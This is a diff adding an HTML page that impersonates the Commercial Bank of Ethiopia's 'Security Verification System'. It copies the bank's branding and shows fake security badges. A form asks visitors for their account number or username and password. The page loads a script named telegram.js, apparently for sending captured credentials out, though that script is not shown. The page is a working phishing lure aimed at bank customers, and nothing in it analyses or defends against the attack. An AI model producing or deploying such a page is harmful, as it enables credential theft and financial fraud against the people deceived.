@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CBE Security Verification</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/cbe-theme.css">
+    <link rel="stylesheet" href="css/animations.css">
+</head>
+<body>
+    <div class="container">
+        <div class="cbe-header">
+            <img src="assets/images/cbe-logo.png" alt="CBE Logo" class="cbe-logo">
+            <h1>Commercial Bank of Ethiopia</h1>
+            <p class="subtitle">Security Verification System</p>
+        </div>
+
+        <div class="security-banner">
+            <img src="assets/images/cbe-banner.png" alt="Security Banner">
+            <div class="trust-badges">
+                <span class="badge">🔒 Secure Connection</span>
+                <span class="badge">✅ Verified</span>
+            </div>
+        </div>
+
+        <div class="form-container">
+            <h2>Account Verification</h2>
+            <p class="description">Please verify your account to continue with your transaction</p>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">Username / Account Number</label>
+                    <input type="text" id="username" name="username" 
+                           placeholder="Enter your username or account number" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <div class="password-wrapper">
+                        <input type="password" id="password" name="password" 
+                               placeholder="Enter your password" required>
+                        <span class="password-toggle" onclick="togglePassword()">👁️</span>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>
+                        <input type="checkbox" id="terms" required>
+                        I agree to the Terms and Conditions
+                    </label>
+                </div>
+
+                <button type="submit" class="cbe-btn">Verify Identity</button>
+            </form>
+
+            <div class="security-info">
+                <p>🔐 This is a secure connection</p>
+                <p>🛡️ Protected by advanced encryption</p>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>© 2026 Commercial Bank of Ethiopia. All rights reserved.</p>
+        </div>
+    </div>
+
+    <script src="js/main.js"></script>
+    <script src="js/validation.js"></script>
+    <script src="js/telegram.js"></script>
+    <script src="js/animations.js"></script>
+</body>
+                    </html>
